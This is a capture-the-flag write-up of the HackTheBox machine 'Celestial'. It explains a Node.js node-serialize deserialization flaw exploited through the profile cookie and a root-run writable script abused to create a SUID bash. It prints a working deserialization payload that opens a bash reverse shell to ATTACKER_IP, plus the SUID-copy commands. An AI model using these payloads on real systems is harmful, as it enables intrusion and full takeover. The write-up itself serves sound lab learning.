## Welcome everyone!

Today, we will explore “*Celestial*”, a medium rated machine from **HackTheBox**.

This machine focuses on **insecure deserialization** in a Node.js application combined with a privilege escalation via writable scripts executed by a privileged process.

Wihout further ado, let’s get started!

![image](/HTB/Celestial/Celestial_images/1.png)

(ensure that you have added the following line   `TARGET_IP     celestial.htb`   to your local `/etc/hosts` file to enable **DNS resolution**)

## Information Gathering

First, we start with a full TCP port scan using **Nmap** to identify exposed services.

![image](/HTB/Celestial/Celestial_images/2.png)

We can identify one open TCP port. An **HTTP** website is running on the port **3000**. We already know from the scan results that the web server is running **Node.js Express**. Attempting to access the framework returns us a 404 error response:

![image](/HTB/Celestial/Celestial_images/3.png)

If we attempt to reload the page, we are granted with some text:

![image](/HTB/Celestial/Celestial_images/4.png)

This behavior suggests strongly that the website sends some cookie form that the client stores to serve the further requests. We can intercept this request made via **Burp Suite** to identify what is stored during the process:

![image](/HTB/Celestial/Celestial_images/5.png)

It appears that a `profile` cookie value is stored by our web browser. The cookie value represents a **Base64-encoded** strings that we can decode in **Repeater** as following:

![image](/HTB/Celestial/Celestial_images/6.png)

Once decoded, we can identify a JSON object containing some keys/values that are reflected in the server’s response:

![image](/HTB/Celestial/Celestial_images/7.png)

This strongly suggests an insecure deserialization vulnerability in the web application. The application appears to use a vulnerable Node.js serialization library (commonly `node-serialize`) that evaluates specially crafted strings during deserialization.

This could lead to a remote code execution if there are vulnerable libraries or logic flaw. We can attempt to craft a JSON object that we could encode and send through the `profile` cookie header. This can be by using the revshell.com template:

`require('child_process').exec('COMMAND')`

We need to craft a JSON object that can be deserialised. To do this, we will add a `rce` key that can be triggered by the web application with the following content at the top of the object:

`{"rce":"_$$ND_FUNC$$_function (){`

and the following strings at the end: `}()"}`

Putting it together, we obtain the following object:

`{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('COMMAND')}()"}`

The prefix `_$$ND_FUNC$$_` indicates that the string should be interpreted as a function and executed during deserialization.

We can use a Bash payload to spawn a reverse shell that we could catch with a **netcat listener**.

The following JSON object can be encoded in Base64 and transfered to the web application through the `profile` cookie header to attempt to get an initial access on the target machine:

`{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/NC_PORT 0>&1\"')}()"}`

This triggers a reverse shell by spawning a bash process and redirecting input/output over TCP.

(ensure that you have set up a listener using `nc -lvnp PORT`)

![image](/HTB/Celestial/Celestial_images/8.png)

Our JSON object has successfully been deserialized! We injected a system command as the serialized() function treated our `rce` key, we obtained initial access as the **sun** user.

Since our current shell has no job controll, we can use the following command to stabilize it in order to execute system commands properly:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

Listing the current directory allows us to retrieve the first flag:

![image](/HTB/Celestial/Celestial_images/9.png)





## Privilege Escalation


We now need to escalate our current privileges to **root** in order to retrieve the final flag. Since we don’t have a valid password for **sun**, we can’t check whether we can run any command with root privileges via `sudo -l`. 

Inspecting the `Documents` folder, we can identify a **Python** script that appears to be executed periodically:

![image](/HTB/Celestial/Celestial_images/10.png)

But inspecting the cron jobs doesn’t reveal anything.No obvious cron jobs were found. We therefore used process monitoring with `pspy64`, a very useful tool for monitoring the running processes on the system. We can transfer it to the target in an accessible directory, such as `/tmp`, via a Python server that we can host using `python3 -m http.server 8000`. We will then use the `wget` utility to download it from the target machine:

![image](/HTB/Celestial/Celestial_images/11.png)

Once we've given it execute permissions, we can run it:

![image](/HTB/Celestial/Celestial_images/12.png)

After a few minutes, we observe that a command is running with the UID 0 (**root**). A process executes every 5 minutes the Python script we found our the `Documents` directory:

![image](/HTB/Celestial/Celestial_images/13.png)

This confirmed that the script is executed periodically with **root privileges**.

The `script.py` script output is redirected into a `output.txt` accessible from our directory. Since the process is running with **root privileges**, we could write a script that read the content of the `/root/root.txt` flag, but it’s way more better if we escalate our privileges to **root**.

Let’s verify first if we have write permissions on it:

![image](/HTB/Celestial/Celestial_images/14.png)

Indeed, we have it. We can simply overwrite the script into a new one which copy the `/bin/bash` binary before setting the **SUID bit** on it in a accessible directory, such as `/tmp`.

The SUID bit allows binaries to execute with the privileges of the file owner, regardless of the executing user. Since the script will be executed as **root**, consequently, the SUID will be set for the **root** user, allowing us to spawn a `root shell` when executing the fake `/bin/bash` executable. The Python script can contain the following code:

`import os`

`os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")`

Since our TTY is weak, nano would be instable for the file editing. We can simply use the `echo` utility:

`echo 'import os' > script.py` 

`echo 'os.system("cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash")' >> script.py`

![image](/HTB/Celestial/Celestial_images/15.png)

After a couple of minutes, the `/tmp/rootbash` executable will be created, allowing us to execute it with **root permissions** and, consequently, spawn a **root Bash shell**:

![image](/HTB/Celestial/Celestial_images/16.png)

The script has successfully been executed generating the root Bash binary. We can now execute it with the `-p` option to prevent the binary from **dropping its privileges** at runtime:

![image](/HTB/Celestial/Celestial_images/17.png)

We successfully escalated our privileges to **root**, granting full access and control over the machine. The `/root` directory can now be accessed, allowing us to retrieve the final flag:

![image](/HTB/Celestial/Celestial_images/18.png)

Challenge completed!

![image](/HTB/Celestial/Celestial_images/19.png)




## Conclusion


This challenge was very interesting to complete. We started by enumerating a website hosting a **Node.js Express** framework which sent us a cookie that we then stored in a `profile` cookie header. The web application was vulnerable to an insecure deserialization, that allowed us to craft a malicious JSON object that, when deserialized, executed arbitrary command on the target system. By leveraging this vulnerability, we executed a Bash payload that initiated a reverse shell, we obtained consequently an initial foothold on the machine as the **sun** user. We identified a script that seemed to be running regularly on the system. Monitoring the running processes by the use of `pspy64`, we discovered a **root process** that executes a script we controlled every 5 minutes. This dangerous configuration permitted to edit the pointed script in order to execute commands with **root permissions** enabling us to escalate our privileges. We created a /bin/bash binary with the **root** **SUID bit** set on it, which led us to spawn a root shell, concluding to a total compromise of the target system.

This machine demonstrated how insecure deserialization in a Node.js application can lead to remote code execution, followed by privilege escalation through a writable script executed by a root process.

**Thank you for reading!**
